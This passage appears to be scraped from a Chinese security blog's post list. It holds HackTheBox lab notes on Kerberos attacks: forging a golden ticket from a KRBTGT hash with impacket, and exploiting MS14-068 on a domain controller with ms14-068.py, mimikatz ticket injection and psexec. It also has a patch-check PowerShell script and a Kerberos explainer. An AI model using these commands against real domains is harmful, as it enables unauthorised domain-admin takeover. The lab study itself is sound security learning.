-在上面的实验中，同样还获得了KRBTGT hash，下面学习学习如何在Linux上使用它
-首先获取domain sid ：
-Get-ADDomain htb.local
-S-1-5-21-3072663084-364016917-1341370565使用NTLM生成TGT###TGT也可以使用AES-KEY生成
-python ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid  S-1-5-21-3072663084-364016917-1341370565 -domain HTB.LOCAL UserDoesnotExit运行之后生成一个UserDoesnotExit.ccache缓存文件使用ccache设置ticket
-export KRB5CCNAME=UserDoesnotExit.ccache
-使用TGT使用下列任意方式远程执行命令
-python psexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
-python smbexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass
-python wmiexec.py &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass执行之前需要同步域控时间，否则会出现下列错误    sudo rdate 10.10.10.161
-
-python psexec.py HTB.LOCAL/UserDoesnotExit@HTB.LOCAL -k -no-pass不能使用IP进行连接
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 26, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="域控提权之ms14-068" alt="域控提权之ms14-068" href="/2020/04/25/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8Bms14-068/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="域控提权之ms14-068" alt="域控提权之ms14-068"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; 域控提权之ms14-068 &gt;</div>
-                            <div class="content flex1">
-                                
-  危害：任意域控用户都可以提权到域控一般为本地账户才能成功，但是使用klist purge清除缓存证书可绕过限制
-一、漏洞成因在 KDC 对 PAC 进行验证时，根据协议规定必须是带有 server Hash、KDC Hash 的签名算法才可以（原本的设计是 HMAC 系列的 checksum 算法），但微软在实现上，却允许任意签名算法。只要客户端指定任意签名算法，KDC 就会使用指定的算法进行签名验证，致使导致恶意用户在发送给KDC的TG_REQ中可以创建包含管理员帐户成员身份的伪造PAC被KDC接收，并将其放入TG_REP中发布的新TGT票证中。该票证可用于向KDC要求服务票证的服务升级特权：在这种情况下，是smb服务票证。 
-什么是PAC（特权帐户证书）：
-PAC包含域控制器（DC）提供的授权数据，Active Directory将授权数据存储在PAC（特权帐户证书）的票证字段中。    PAC由DC在服务单的现场授权数据中提供。它用KDC密钥（只有AD知道）签名，并用要验证的服务和AD之间共享的服务密钥签名。
-二、利用条件1.域控机器没有打漏洞补丁      补丁号：KB3011780
-2.拥有一台域内机子及其sid三、漏洞利用漏洞检测：FindSMB2UpTime.py(但是这个并不一定准确，因为域控是一般不会重启，但是也有存在意外重启的情况，那么即使有ms14-068也不会显示)
-./FindSMB2UPTime.py 192.168.31.220
-DC is up since: 2013-12-28 22:24:25
-This DC is vulnerable to MS14-068获取域控制器补丁状态:Get-DCPatchStatus.ps1
-# This is an example script only.
-import-module activedirectory
-[string]$KBNumber = &quot;KB3011780&quot;
-$DomainControllers = Get-ADDomainController -filter *
-[int]$DomainControllersCount = $DomainControllers.Count
-[int]$PatchedDCCount = 0
-[int]$UnPatchedDCCount = 0
-$UnpatchedDCs = @()
-Write-Output &quot;Scanning $DomainControllersCount Domain Controllers for patch $KBNumber&quot;
-ForEach ($DomainController in $DomainControllers)
-{
-    $DomainControllerHostName = $DomainController.HostName
-    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue
-
-    IF ($PatchStatus.InstalledOn)
-        {
-            $PatchStatusInstalledOn = $PatchStatus.InstalledOn
-            Write-Output &quot;$DomainControllerHostName patched on $PatchStatusInstalledOn&quot;
-            $PatchedDCCount++
-        }
-    Else
-        {
-            Write-Warning &quot;$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)&quot;
-            [array]$UnpatchedDCs += $DomainController.HostName
-            $UnPatchedDCCount++
-        }
-}
-Write-Output &quot;Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount &quot;
-IF ($UnpatchedDCs)
-{
-    Write-Output &quot;The following DCs are NOT patched for $KBNumber&quot;
-    $UnpatchedDCs
-}环境描述：
-目标机器：10.10.10.52  Windows Server 2008 R2 Standard
-已获取：DC上的一个普通本地账户
-
-james用户账户密码
-
-
-james sid （可通过多种途径获取rpclient：lookupnames james目标机器shell中：whoami /all ，）
-
-攻击机：kali 10.10.14.14  （不在域中）
-在Linux上：(没有目标shell的情况下)1.安装客户端，在客户端生成票证
-sudo apt-get install krb5-user cifs-utils rdate2./etc/hosts中添加：（内网机器没有映射，所以需要添加）
-10.10.10.52 htb.local htb mantis.htb.local  mantis3.编辑/etc/krb5.conf
-[libdefaults]
-    default_realm = HTB.LOCAL
-
-[realms]
-   HTB.LOCAL = {
-    kdc = mantis.htb.local:88
-    admin_server = mantis.htb.local
-    default_domain = HTB.LOCAL
-    }
-[domain_realm]
-    .domain.internal = HTB.LOCAL
-    domain.internal = HTB.LOCAL4.添加路由：编辑/etc/resolve.conf
-nameserver 10.10.10.525.同步域控时间（确定DC的时间（用于票证同步），按照RFC必须在5分钟内完成，但+ -30分钟的偏差也可以的）
-
-[方法1]net time -S 10.10.10.52 -U“” ##获取DC时间，然后收到设置本机时间
-
-[方法2]sudo rdate -n 10.10.10.52  ###直接同步到域控时间
-
-
-6.为james用户生成一张新的Kerberos票证
-kinit -V james@HTB.LOCAL       ###kinit中域名需要大写；或直接 kinit james
-klist
-此时生成的是jame是的票证：访问C$是没有权限的
-kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -k
-tree connect failed: NT_STATUS_ACCESS_DENIED7.ms14-068生成高权限TGT票证
-
-8.替换低权限票证
-mv TGT_james@HTB.LOCAL.ccache  /tmp/krb5cc_10009.smb成功登录C$
-
-Mimikatz：先在目标机器使用ms14-068.exe生成票据，然后使用mimikatz注入票据，再使用psexec获取权限或winexec执行命令
-ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis将TGT_james@HTB.LOCAL.ccache文件放入mimikatz目录中
-mimikatz.exe log &quot;kerberos::ptc TGT_james@HTB.LOCAL.ccache&quot; exit注入成功即可获得域管理session，可以klist看一下是否有了kerberos Ticket
-net use \\htb.local\admin$    ####使用IP可能会失败
-dir \\htb.local\c$ 
-psexec  \\htb.local  cmd.exe突破“本地账户才能漏洞利用”的限制：先 klist purgr清除缓存证书，再使用mimikatz生成高权限TGT的缓存证书进行连接原理：https://www.freebuf.com/vuls/56081.html
-GoldenPac,py也有更简便的方法，不需要上边的种种配置，直接使用impacket套件下的GoldenPac一发入魂（ms14-068+psexec）
-
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
-                            </div>
-                        </div>
-                    </a>
-                
-                    <a title="Kerberos认证学习" alt="Kerberos认证学习" href="/2020/04/25/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"
-                       class="post-item swiper-slide flex flex-v">
-                        <div class="image">
-                            
-                                <img title="Kerberos认证学习" alt="Kerberos认证学习"
-                                     src="/images/default.jpg"></img>
-                            
-                        </div>
-                        <div class="content-warp flex1 flex flex-v">
-                            <div class="title">&lt; Kerberos认证学习 &gt;</div>
-                            <div class="content flex1">
-                                
-  Kerberos简介：
-
-Kerberos来源于希腊神话中的三头犬、寓意着需要第三方（密钥分发中心）来进行通信，即KDC永远不会和Client所要请求的Server进行通信（工具人！！！）
-
-几乎每次互动，都会收到两条消息（一个用于响应，另一个则用于请求下一个服务）
-
-Kerberos非常依赖加密密钥，所有通信步骤中都用到共享密钥
-
-
-
-
-1、AS-REQClient将用户密码转换成NTLM hash，使用该hash对时间戳进行加密;然后将纯文本形式的时间戳以及身份信息[你的名称/ID、请求的服务名称/ID(这里为TGS：Ticket Granting Server)]、TGT生存期等）发送给AS
-2、AS-REPAS收到Client发送的身份信息，从KDC数据库中检索身份信息（只检查用户是否存在，而不检查用户凭据）。用户存在则生成一个随机的session key（会话密钥）[用于给Client请求TGS]    
-AS向Clinet发送两条消息：        
-消息1包含如下信息：[使用TGS SECRET KEY（同样存储在KDC数据库中）加密]—&gt;也就是使用TGS密钥加密TGT
-步骤1中用户提供的信息+TGS SESSION KEY                
-消息2包含如下信息：[使用用户密钥（也就是用户NTLM hash）加密]     
-TGS名称/ID            
-时间戳            
-TGS SESSION KEY
-TGT生存期`消息1为Client所请求的TGT，但是由于没有TGS SCRECT KEY,所以无法解密，此时TGT存储在Client凭据缓存中 消息2解密后获得TGS SESSION KEY
-3、TGS-REQ(金票攻击发生在此步骤)
-Client向TGS发送两条消息消息1：[使用TGS SESSION KEY进行加密]  
-你的名称/ID
-时间戳`消息2：[未加密消息]
-所要请求服务的名称/ID
-服务的有效生存期同时还会发送步骤2中收到的TGT。TGS收到Client信息，会先到KDC数据库中检查请求的服务是否存在
-4、   TGS-REPTGS使用TGS SECRET KEY解密得到未加密的TGT，包含TGS SESSION KEY,TGS SESSION KEY解密Client消息中的加密信息解密之后，TGS对如下信息进行检查    
-步骤3中消息1解密后得到的用户名称/ID与TGT的进行比较
-步骤3中消息1解密后得到的时间戳与TGT中的进行比较（默认为2分钟
-检查TGT是否过期
-检查TGS缓存中是否已有该用户凭据，避免重播检查无误之后，同样向客户端发送两条消息
-消息1：[生成的使用Service Secret Key加密后的TGS]—-&gt;Kerberos令牌
-消息2：[TGS Session Key加密]    
-服务名称/ID   
-时间戳    
-票据生存期    
-Service Session Key5、AP-REQ银票攻击发生在此步骤
-Client使用TGS SESSION KEY解密得到SERVER SESSION KEY,然后使用SERVER SESSION KEY加密如下消息：    
-用户名称/ID
-时间戳`该消息加密之后与和TGS一同发送给服务端服务端使用SERVER SECRET KEY解密TGS，验证完成，服务端允许Client在TGS中指定的时间内访问请求资源
-6、AP-REP启用相互认证的情况下，交换时间戳进行相互认证
-
-
-
-                            </div>
-                            <div class="post-tags">
-                                
-                            </div>
-                            <div class="other">
-                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
-                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
-                                <span><i class="iconfont icon-shijian"></i>Apr 25, 2020</span>
                             </div>
                         </div>
                     </a>
